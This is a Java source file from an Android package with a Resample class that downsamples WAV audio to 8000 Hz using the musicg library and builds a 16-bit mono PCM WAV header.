package com.android.deviceinfo.resample;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;
import com.musicg.dsp.Resampler;
import com.musicg.wave.Wave;
import com.musicg.wave.WaveFileManager;
import com.musicg.wave.WaveHeader;

public class Resample {
	private static final String TAG = "Resample"; //$NON-NLS-1$
	
	public static void resample(String src, String dst) {
		Wave wave = new Wave(src);

		// Resample to 
		Resampler resampler = new Resampler();
		int sourceRate = wave.getWaveHeader().getSampleRate();
		
		int targetRate = 8000;
		byte[] resampledWaveData = resampler.reSample(wave.getBytes(), wave.getWaveHeader().getBitsPerSample(), sourceRate, targetRate);

		// update the wave header
		WaveHeader resampledWaveHeader = wave.getWaveHeader();
		
		if (Cfg.DEBUG) {
			//Check.log(TAG + "(resample): header: " + resampledWaveHeader.toString());
		}
		
		resampledWaveHeader.setSampleRate(targetRate);

		// Make resampled wave
		Wave resampledWave = new Wave(resampledWaveHeader, resampledWaveData);

		//System.out.println(resampledWave);

		WaveFileManager wfm = new WaveFileManager(resampledWave);
		wfm.saveWaveAsFile(dst);
	}
	
	public static Wave resampleRaw(WaveHeader header, byte[] data) {
		// Resample to 
		Resampler resampler = new Resampler();
		int sourceRate = header.getSampleRate();
		
		int targetRate = 8000;
		byte[] resampledWaveData = resampler.reSample(data, header.getBitsPerSample(), sourceRate, targetRate);

		// update the wave header
		WaveHeader resampledWaveHeader = header;
		
		if (Cfg.DEBUG) {
			//Check.log(TAG + "(resampleRaw): header: " + resampledWaveHeader.toString());
		}
		
		resampledWaveHeader.setSampleRate(targetRate);

		// Make resampled wave
		Wave resampledWave = new Wave(resampledWaveHeader, resampledWaveData);

		return resampledWave;
	}
	
	public static WaveHeader createHeader(int sampleRate, int chunkSize) {
		// https://ccrma.stanford.edu/courses/422/projects/WaveFormat/
		WaveHeader wh = new WaveHeader();
		
		int numSamples = chunkSize / 2; // 16-bit per sample
		
		wh.setChunkId(WaveHeader.RIFF_HEADER);
		wh.setChunkSize(chunkSize); // Filesize - 8
		wh.setFormat(WaveHeader.WAVE_HEADER);
		wh.setSubChunk1Id(WaveHeader.FMT_HEADER);
		wh.setSubChunk1Size(16);
		wh.setAudioFormat(1); // PCM
		wh.setChannels(1);
		wh.setSampleRate(sampleRate);
		wh.setByteRate(sampleRate * 1 * 16/8); // SampleRate * NumChannels * BitsPerSample/8
		wh.setBlockAlign(1 * 16/8); // NumChannels * BitsPerSample/8
		wh.setBitsPerSample(16);
		wh.setSubChunk2Id(WaveHeader.DATA_HEADER);
		wh.setSubChunk2Size(numSamples * 1 * 16/8); // NumSamples * NumChannels * BitsPerSample/8

		if (Cfg.DEBUG) {
			//Check.log(TAG + "(createHeader): " + wh.toString());
		}
		
		return wh;
	}
}